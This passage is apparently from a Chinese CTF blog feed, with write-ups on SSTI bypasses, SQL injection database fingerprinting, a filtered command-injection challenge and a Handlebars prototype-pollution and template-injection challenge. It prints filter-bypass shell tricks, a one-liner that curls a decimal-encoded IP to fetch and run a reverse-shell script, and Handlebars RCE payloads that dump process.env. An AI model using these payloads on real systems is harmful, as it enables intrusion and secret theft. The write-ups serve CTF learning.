punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">102</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"read"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span>

</code></pre>
<h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>看了venom的wp，他们直接使用\xff这种十六进制字符就直接绕了，不必项我们这么格式化字符串大费周章，不过还是都记一下</p>
<h2 id="pyer"><a href="#pyer" class="headerlink" title="pyer"></a>pyer</h2><p>登录，密码那里测半天没反应，用户名那里输引号后500，用注释符之后恢复正常，万能密码登录失败<br>给人的感觉就是上次嘶吼的那个整数溢出注入，然后再把用户名密码进行一个写死的登录（试了下sleep()时间盲注，但是sleep用了就500，怀疑是没这个函数)</p>
<h3 id="数据库类型判断"><a href="#数据库类型判断" class="headerlink" title="数据库类型判断"></a>数据库类型判断</h3><p>学一手新知识，如何判断数据库的类型<br>常见SQL也就MySQL，sqlite，pgsql，后面这几个应该也很多但是做题遇不到。。。mongodb、Access、MSsql(就是SQL server)</p>
<h4 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h4><p>mysql能用#作为注释符，而sqlite则不行，#注释打不通但–打得通就必然不是MySQL</p>
<h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>sqlite和pgsql的sleep函数都不直接叫sleep（sqlite好像没有sleep函数），mysql的sleep函数就叫sleep<br>还可以直接执行sqlite_version()看出不出问题直接确认是不是sqlite</p>
<h4 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h4><p>pgsql不会自动进行类型转换，所以像<code>or &#39;1&#39;</code>这种语句就会直接报错，而不是转换成数字之后继续查询</p>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>发现了这点之后就是个整数溢出盲注，打穿了之后又是一个SSTI，云了，就看了一眼，好像注入和SSTI过滤都不严</p>
<h2 id="cloud"><a href="#cloud" class="headerlink" title="cloud"></a>cloud</h2><p>队友扫目录发现了robots.txt<br>robots.txt里面有一个&#x2F;static&#x2F;.git&#x2F;目录访问无果，404，访问static目录403，但显示使用的是beego 1.12.2这个框架<br>翻了一遍全是静态，再扫一波，扫出来一个admin.html和admin路由，admin.html里面藏了一个发送到admin路由的登录表单，怎么还能扫出来一个phpinfo.php的呢。。。里面还是个PHP7的phpinfo<br>开始注入<br>注入结束，admin admin就能登进去，给了一份源码和一个路由<br>go源码不太会，下下来的这个文件居然可以改后缀为tar之后解压缩出来，不过里面的内容本身就是明文可以直接看，解压缩出来之后还是有条理一点，能看到一些整个看不到的文件，但是还是不会go</p>
<h2 id="HIDS"><a href="#HIDS" class="headerlink" title="HIDS"></a>HIDS</h2><p>这个题是认真看的，学到一点东西</p>
<p>直接命令执行，就是过滤了一万个字符<br>rmb神仙教会了我新操作，不知道过滤了什么字符的时候直接进行一个全字符的fuzz，看看有哪些能用再思考对策<br>fuzz结果为<code>&quot;$()0123456789;&gt;ABCDEFGHIJKLMNOPQRSTUVWXYZ\abcdefghijklmnopqrstuvwxyz</code><br>特殊字符仅有<code>$()\;&gt;</code><br>$(cmd)这种形式约等于反引号，$IFS作为占位符代替空格，<code>cd$IFS$(ls);cat$IFS$(ls$IFS$(ls))</code>可以拿到web目录下的app.py，源码</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template<span class="token punctuation">,</span> request
<span class="token keyword">import</span> subprocess<span class="token punctuation">,</span> re

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>


@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>


@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/run'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    cmd <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token triple-quoted-string string">'''[^0-9a-zA-Z">\\\$();]'''</span><span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'Hacker!'</span>
    <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token triple-quoted-string string">'''ping|wget|curl|bash|perl|python|php|kill|ps'''</span><span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'Hacker!'</span>
    p <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> close_fds<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token punctuation">(</span>msg<span class="token punctuation">,</span> errs<span class="token punctuation">)</span> <span class="token operator">=</span> p<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> msg
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'Error!'</span>


app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token string">'5000'</span><span class="token punctuation">)</span>
</code></pre>
<p>没什么东西，比fuzz结果多过滤了几个单词</p>
<h3 id="shell小技巧"><a href="#shell小技巧" class="headerlink" title="shell小技巧"></a>shell小技巧</h3><p>我连这都不知道，实属愚蠢的一匹<br>$v会直接使命令行执行v的值，如下</p>
<pre class=" language-shell"><code class="language-shell">lzx@ubuntu:~/Desktop$ a=ls
lzx@ubuntu:~/Desktop$ $a
c-jwt-cracker-master  homework_OS      ping.php  test.php
cookie_crash.rb       php_mt_seed-4.0  test
</code></pre>
<p>而$(cmd)就会把cmd执行的结果输入到命令行，也就等价于反引号，现在想起来才发现，我太垃圾了</p>
<h3 id="sh特性"><a href="#sh特性" class="headerlink" title="sh特性"></a>sh特性</h3><p>从报错中可以得知执行命令的shell是&#x2F;bin&#x2F;sh，一般来说这是一个软链接，链接到&#x2F;bin&#x2F;dash<br>本地测试发现其可以解析八进制，也就是可以使用八进制绕过一切，基本上约等于任意命令执行<br>但是只有在引号里的八进制才能被解析成字符，而引号又会转义绝大多数的元字符，弹shell中使用的&gt;&amp;等字符就被转义了，还是不能一个语句打穿<br>不过幸好留了一个&gt;，可以写文件，而$()能嵌套，最终导致任意文件写，再让shell去执行就可以了<br>$($(echo “cmd”)&gt;$(echo “filepath”))<br>等价于cmd&gt;filepath，而cmd和filepath又全都是在引号里面，echo出来的，所以可以使用八进制绕过一切大法打通</p>
<h3 id="垃圾zsh"><a href="#垃圾zsh" class="headerlink" title="垃圾zsh"></a>垃圾zsh</h3><p>本地测试的时候一开始用的zsh(因为比较酷炫)，然后发现zsh啥特性都没有，$IFS占位符都不能替代空格，八进制绕过什么的都不存在，切到最原始的sh之后应有尽有，bash也只能用用$IFS，没有神奇八进制绕过<br>bash可以十六进制绕过，dash使用八进制时只需\111这种格式即可，而bash则需要\x11这种格式</p>
<h3 id="神仙的神仙做法"><a href="#神仙的神仙做法" class="headerlink" title="神仙的神仙做法"></a>神仙的神仙做法</h3><p>神仙就是神仙啊，碾压我秒杀垃圾题目</p>
<h4 id="trick1-引号打断"><a href="#trick1-引号打断" class="headerlink" title="trick1-引号打断"></a>trick1-引号打断</h4><p>这个倒不算特别稀奇，之前也就学会了这个点，Linux引号不打断输入，只是作为转义元字符的符号，所以”cu””rl”这样子的命令也是能执行的</p>
<h4 id="trick-2-IP的十进制表示"><a href="#trick-2-IP的十进制表示" class="headerlink" title="trick-2 IP的十进制表示"></a>trick-2 IP的十进制表示</h4><p>这个操作我是有所耳闻的，这样子就直接绕过ip中.不在可用字符中的限制，我太垃圾了，学过的东西也应用不起来<br>然后<code>$(&quot;cu&quot;&quot;rl&quot;$IFS&quot;795315244&quot;)</code>在自己vps上放一个弹shell语句，curl取回的结果直接执行，$IFS占位符代替空格，一键打通，太牛逼了</p>
<h3 id="something-about-IFS"><a href="#something-about-IFS" class="headerlink" title="something about $IFS"></a>something about $IFS</h3><p>感觉没有想象中一个占位符那么简单，比如$IFS后如果直接接东西的话，如何辨别这个变量名到底是$IFS还是$IFSxx呢，目前测试的结果是$IFSxx后面的内容会被忽略掉，空格分号引号管道符之类的都能用来分隔</p>
<h3 id="语义分析"><a href="#语义分析" class="headerlink" title="语义分析"></a>语义分析</h3><p>有一瞬间感觉直接输入数字输入的参数就是数字，带了引号之后就变成字符串了。。。。我着实是个憨批，输入参数必然是当字符串用的啊，而引号也只不过是个范围转义罢了，不要想太多<br>语义分析语义分析</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>[XCTF]华为第三场</title>
    <url>/%5BXCTF%5D%E5%8D%8E%E4%B8%BA%E7%AC%AC%E4%B8%89%E5%9C%BA.html</url>
    <content><![CDATA[<h1 id="XCTF-华为第三场"><a href="#XCTF-华为第三场" class="headerlink" title="[XCTF]华为第三场"></a>[XCTF]华为第三场</h1><p>华为三连最后一场，web就两个题，一个题是nodejs模板注入，是一个完全不了解的领域<br>还有一个是PHP题，不知道出题人想表达什么<br>学了一天nodejs的hbs库的模板注入，不过还是没怎么懂，可能学的不够认真，也不知道怎么去调试，文档也没看几句，js的玄妙特性也不了解。。。</p>
<h2 id="华为HCIE的第一课"><a href="#华为HCIE的第一课" class="headerlink" title="华为HCIE的第一课"></a>华为HCIE的第一课</h2><p>登录，进去之后有一个没有用的功能，进admin路由，403，发现f参数任意文件读取，先回上层目录读了app.js，获得目录结构之后读admin.js，util.js等文件<br>admin.js需要验证用户是否本地登录，不行就403，但是存在一个使用__proto__覆盖的机会</p>
<pre class=" language-javascript"><code class="language-javascript">            user <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`{"name" : "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">", "time" : "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>Math<span class="token punctuation">.</span><span class="token function">ceil</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">", "ip" : "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>ip<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">"}`</span></span><span class="token punctuation">)</span>
</code></pre>
<p>req.session.name就是登录时输入的用户名，完全可控，可以重新闭合引号多解析出一个变量出来，后面又有这么一份赋值语句</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">let</span> userinfo <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>key<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"isAdmin"</span><span class="token punctuation">)</span>
        userinfo<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">else</span> userinfo<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> user<span class="token punctuation">[</span>key<span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre>
<p>userinfo一开始是没有isAdmin属性的，虽然不能直接创建一个isAdmin属性，但是可以使用__proto__来完成一次赋值<br>登录时令username为<code>z33&quot;,&quot;__proto__&quot;:&#123;&quot;isAdmin&quot;:1&#125;, &quot;t&quot;: &quot;t</code>即可<br>admin路由有一个写模板功能，可以打一个模板注入，读文件收集信息可知使用的是hbs库实现的渲染，读package.json知hbs版本为^4.1.1<br>google一下hbs的模板注入，发现两篇文章，其中第一篇提到hbs的注入刚好是4.1.1版本，第二篇bypass了4.1.1的修复<br><a href="https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html#main">hbsRCE</a><br><a href="https://aluvion.github.io/2019/04/11/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/#Handlebars%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%88%B0RCE">hbsRCEpayload简析</a><br><a href="https://handlebarsjs.com/guide/hooks.html">hbs官方文档</a></p>
<p>虽然最后题解不是RCE，但是这个东西我还是学了蛮久。。。到时候还要再理一下<br>又：本地搭建环境之后去除所有过滤上述文章payload仍然打不通，会出现利用过程中的一些对象不存在之类的问题</p>
<h3 id="HBS模板语法"><a href="#HBS模板语法" class="headerlink" title="HBS模板语法"></a>HBS模板语法</h3><p>这种题目，还是要先看官方文档为好，一开始没看文档的我搞了半天一无所知</p>
<h4 id=""><a href="#" class="headerlink" title=""></a>{{#with xxx}} {{/with}} </h4><p>with语句将切换当前块内的上下文，也就是把this指向那个xxx，可以用with xxx as name，再多层with嵌套的时候通过name可以获取到外层的对象<br>记得闭合with</p>
<h4 id="-1"><a href="#-1" class="headerlink" title=""></a>{{#each xxx}} {{/each}} </h4><p>创建一个循环，遍历xxx中的每个元素，并且把context指向每次遍历的元素<br>均需要闭合标签</p>
<h4 id="lookup"><a href="#lookup" class="headerlink" title="lookup"></a>lookup</h4><p>进行数据查找，lookup xxx xxx，动态进行查找返回查找的值</p>
<h4 id="log"><a href="#log" class="headerlink" title="log"></a>log</h4><p>输出到控制台，本地搭建环境之后用这个调试比较舒服</p>
<h3 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h3><pre class=" language-handlebars"><code class="language-handlebars">
<span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">#with</span> <span class="token variable">this</span> <span class="token variable">as</span> <span class="token punctuation">|</span><span class="token variable">obj</span><span class="token punctuation">|</span><span class="token delimiter punctuation">}}</span></span>
    <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">#with</span> <span class="token punctuation">(</span><span class="token variable">obj</span><span class="token punctuation">.</span><span class="token variable">constructor</span><span class="token punctuation">.</span><span class="token variable">keys</span> <span class="token string">"1"</span><span class="token punctuation">)</span> <span class="token variable">as</span> <span class="token punctuation">|</span><span class="token variable">arr</span><span class="token punctuation">|</span><span class="token delimiter punctuation">}}</span></span>
        <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token variable">arr</span><span class="token punctuation">.</span><span class="token variable">pop</span><span class="token delimiter punctuation">}}</span></span>
        <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token variable">arr</span><span class="token punctuation">.</span><span class="token variable">push</span> <span class="token variable">obj</span><span class="token punctuation">.</span><span class="token variable">constructor</span><span class="token punctuation">.</span><span class="token variable">name</span><span class="token punctuation">.</span><span class="token variable">constructor</span><span class="token punctuation">.</span><span class="token variable">bind</span><span class="token delimiter punctuation">}}</span></span>
        <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token variable">arr</span><span class="token punctuation">.</span><span class="token variable">pop</span><span class="token delimiter punctuation">}}</span></span>
        <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token variable">arr</span><span class="token punctuation">.</span><span class="token variable">push</span> <span class="token string">"return JSON.stringify(process.env);"</span><span class="token delimiter punctuation">}}</span></span>
        <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token variable">arr</span><span class="token punctuation">.</span><span class="token variable">pop</span><span class="token delimiter punctuation">}}</span></span>
            <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">#blockHelperMissing</span> <span class="token variable">obj</span><span class="token punctuation">.</span><span class="token variable">constructor</span><span class="token punctuation">.</span><span class="token variable">name</span><span class="token punctuation">.</span><span class="token variable">constructor</span><span class="token punctuation">.</span><span class="token variable">bind</span><span class="token delimiter punctuation">}}</span></span>
              <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">#with</span> <span class="token punctuation">(</span><span class="token variable">arr</span><span class="token punctuation">.</span><span class="token variable">constructor</span> <span class="token punctuation">(</span><span class="token variable">obj</span><span class="token punctuation">.</span><span class="token variable">constructor</span><span class="token punctuation">.</span><span class="token variable">name</span><span class="token punctuation">.</span><span class="token variable">constructor</span><span class="token punctuation">.</span><span class="token variable">bind</span><span class="token punctuation">.</span><span class="token variable">apply</span> <span class="token variable">obj</span><span class="token punctuation">.</span><span class="token variable">constructor</span><span class="token punctuation">.</span><span class="token variable">name</span><span class="token punctuation">.</span><span class="token variable">constructor</span> <span class="token variable">arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token delimiter punctuation">}}</span></span>
                <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">#with</span> <span class="token punctuation">(</span><span class="token variable">obj</span><span class="token punctuation">.</span><span class="token variable">constructor</span><span class="token punctuation">.</span><span class="token variable">getOwnPropertyDescriptor</span> <span class="token variable">this</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token delimiter punctuation">}}</span></span>
                  <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">#with</span> <span class="token punctuation">(</span><span class="token variable">obj</span><span class="token punctuation">.</span><span class="token variable">constructor</span><span class="token punctuation">.</span><span class="token variable">defineProperty</span> <span class="token variable">obj</span><span class="token punctuation">.</span><span class="token variable">constructor</span><span class="token punctuation">.</span><span class="token variable">prototype</span> <span class="token string">"toString"</span> <span class="token variable">this</span><span class="token punctuation">)</span><span class="token delimiter punctuation">}}</span></span>
                     <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">#with</span> <span class="token punctuation">(</span><span class="token variable">obj</span><span class="token punctuation">.</span><span class="token variable">constructor</span><span class="token punctuation">.</span><span class="token variable">constructor</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token delimiter punctuation">}}</span></span>
                        <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token variable">this</span><span class="token delimiter punctuation">}}</span></span>
                     <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">/with</span><span class="token delimiter punctuation">}}</span></span>
                  <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">/with</span><span class="token delimiter punctuation">}}</span></span>
                <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">/with</span><span class="token delimiter punctuation">}}</span></span>
              <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">/with</span><span class="token delimiter punctuation">}}</span></span>
            <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">/blockHelperMissing</span><span class="token delimiter punctuation">}}</span></span>
  <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">/with</span><span class="token delimiter punctuation">}}</span></span>
<span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">/with</span><span class="token delimiter punctuation">}}</span></span>

</code></pre>
<p><strong>由于每次函数调用都会额外添加一个多余的this，所以push之后都将额外的this给弹出</strong></p>
<p>根据payload的思路，应该是构造出了一个[String.constructor.bind,”console.log(process.env)”]数组，用String.constructor.bind.apply以String.constructor和arr为参数，制造出一个以String.constructor为this，arr为参数的String类构造函数<del>到这里已经不知道在干什么了</del>然后再将返回的构造函数再用Array的构造函数构造成一个array，然后调用getOwnPropertyDescriptor，获取到array的第一个元素（也就这一个元素），为之前构造的String.constructor函数的描述符<br>最后使用defineProperty进行原型链污染，将其Object的toString函数修改为我们构造的String.constructor<br>最后用Object.constructor构造对象触发toString函数，返回payload，成功执行命令<br>我不太能理解这一系列的复杂操作，连勉强看懂他在做什么都非常困难</p>
<h4 id="payload1失败"><a href="#payload1失败" class="headerlink" title="payload1失败"></a>payload1失败</h4><blockquote>
<p>官方补丁为 禁止访问构造函数，4.1.1理应是最后一个受影响的版本</p>
</blockquote>
<p>本地和远端都在第一步从Object获取key产生数组就失败了，log的结果是obj.constructor undefined，确认了一下本地hbs版本是4.1.1，即没打补丁的最后一个版本，但是还是打不通，不知道为什么</p>
<p>分析文章的思路，想要RCE一定是需要凑一个数组出来调用一波函数的，因此继续寻找可用方法<br>感觉上来说，这里是只能通过几个基础数据对象进行链式调用的，而我们能直接产生的对象有int，string，object(this是一个object)，本地测试发现方括号[]产生的也是this对象<br>需要获取一个链式调用拿一个array来代替<br>这时看到我们的第二个payload</p>
<h3 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h3><pre class=" language-handlebars"><code class="language-handlebars">
<span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">#with</span> <span class="token string">"s"</span> <span class="token variable">as</span> <span class="token punctuation">|</span><span class="token variable">string</span><span class="token punctuation">|</span><span class="token delimiter punctuation">}}</span></span>
  <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">#with</span> <span class="token string">"e"</span><span class="token delimiter punctuation">}}</span></span>
    <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">#with</span> <span class="token variable">split</span> <span class="token variable">as</span> <span class="token punctuation">|</span><span class="token variable">conslist</span><span class="token punctuation">|</span><span class="token delimiter punctuation">}}</span></span>
      <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token variable">this</span><span class="token punctuation">.</span><span class="token variable">pop</span><span class="token delimiter punctuation">}}</span></span>
      <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token variable">this</span><span class="token punctuation">.</span><span class="token variable">push</span> <span class="token punctuation">(</span><span class="token variable">lookup</span> <span class="token variable">string</span><span class="token punctuation">.</span><span class="token variable">sub</span> <span class="token string">"constructor"</span><span class="token punctuation">)</span><span class="token delimiter punctuation">}}</span></span>
      <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token variable">this</span><span class="token punctuation">.</span><span class="token variable">pop</span><span class="token delimiter punctuation">}}</span></span>
      <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">#with</span> <span class="token variable">string</span><span class="token punctuation">.</span><span class="token variable">split</span> <span class="token variable">as</span> <span class="token punctuation">|</span><span class="token variable">codelist</span><span class="token punctuation">|</span><span class="token delimiter punctuation">}}</span></span>
        <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token variable">this</span><span class="token punctuation">.</span><span class="token variable">pop</span><span class="token delimiter punctuation">}}</span></span>
        <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token variable">this</span><span class="token punctuation">.</span><span class="token variable">push</span> <span class="token string">"return JSON.stringify(process.env);"</span><span class="token delimiter punctuation">}}</span></span>
        <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token variable">this</span><span class="token punctuation">.</span><span class="token variable">pop</span><span class="token delimiter punctuation">}}</span></span>
        <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">#each</span> <span class="token variable">conslist</span><span class="token delimiter punctuation">}}</span></span>
          <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">#with</span> <span class="token punctuation">(</span><span class="token variable">string</span><span class="token punctuation">.</span><span class="token variable">sub</span><span class="token punctuation">.</span><span class="token variable">apply</span> <span class="token number">0</span> <span class="token variable">codelist</span><span class="token punctuation">)</span><span class="token delimiter punctuation">}}</span></span>
            <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token variable">this</span><span class="token delimiter punctuation">}}</span></span>
          <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">/with</span><span class="token delimiter punctuation">}}</span></span>
        <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">/each</span><span class="token delimiter punctuation">}}</span></span>
      <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">/with</span><span class="token delimiter punctuation">}}</span></span>
    <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">/with</span><span class="token delimiter punctuation">}}</span></span>
  <span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">/with</span><span class="token delimiter punctuation">}}</span></span>
<span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">/with</span><span class="token delimiter punctuation">}}</span></span>

</code></pre>
<p>更为简洁的代码，思路似乎更为清晰，使用String.split获取到了数组，然后再用pop把数组元素丢掉拿到空数组<br>但是同样出现了问题，<code>lookup string.sub &quot;constructor&quot;</code>查找结果为空，本来这里应该拿到一个Function()，但是本地结果也为undefined。。。<br>加上题目本身就过滤了lookup等字段，更加打不通<br>通过两个split分别拿到两个数组[Function()]和[“return JSON.stringify(process.env);”]<br>然后使用this调用该函数完成命令执行<br>等价于<code>Function.apply(Function(), [&quot;return JSON.stringify(process.pid);&quot;])()</code><br>即用Function构造函数构造了一个内容为<code>return JSON.stringify(process.pid);</code>的匿名函数并完成自调用</p>
<p>但是由于我对js不够熟练，没能找出来新的替代方法，就个人感觉，lookup那里也许能直接用.constructor获取构造函数而不用lookup呢？但是本地测试都是undefined。。。就没办法了</p>
<p>后来还找到一篇将绕过官方补丁的，但是更加看不懂了。。。<br><a href="https://blog.tarq.io/handlebars-4-1-2-command-execution/">bypass4.1.1修复</a></p>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>最后师傅出的时候发现也并不需要超级绕过进行RCE，只需要了解一下hbs的基本模板，从this中查看env就能看到在env中的flag<br>payload</p>
<pre class=" language-handlebars"><code class="language-handlebars">
<span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">#each</span><span class="token delimiter punctuation">}}</span></span>
	<span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">#each</span><span class="token delimiter punctuation">}}</span></span>
		<span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token variable">this</span><span class="token delimiter punctuation">}}</span></span>
	<span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">/each</span><span class="token delimiter punctuation">}}</span></span>
<span class="token handlebars"><span class="token delimiter punctuation">{{</span><span class="token block keyword">/each</span><span class="token delimiter punctuation">}}</span></span>

</code></pre>
<p>两层循环遍历全部属性即可</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>ssti</tag>
      </tags>
  </entry>
  <entry>
    <title>XCTF 抗疫赛 webtmp</title>
    <url>/%5BXCTF%5D%20webtmp.html</url>
    <content><![CDATA[<h1 id="XCTF-抗疫赛-webtmp"><a href="#XCTF-抗疫赛-webtmp" class="headerlink" title="[XCTF 抗疫赛] webtmp"></a>[XCTF 抗疫赛] webtmp</h1><p>python的反序列化漏洞，看opcode手搓pickle来完成，萌新头一次在真正的比赛上打出了输出呜呜呜</p>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> base64
<span class="token keyword">import</span> io
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> pickle

<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> Response<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request
<span class="token keyword">import</span> secret


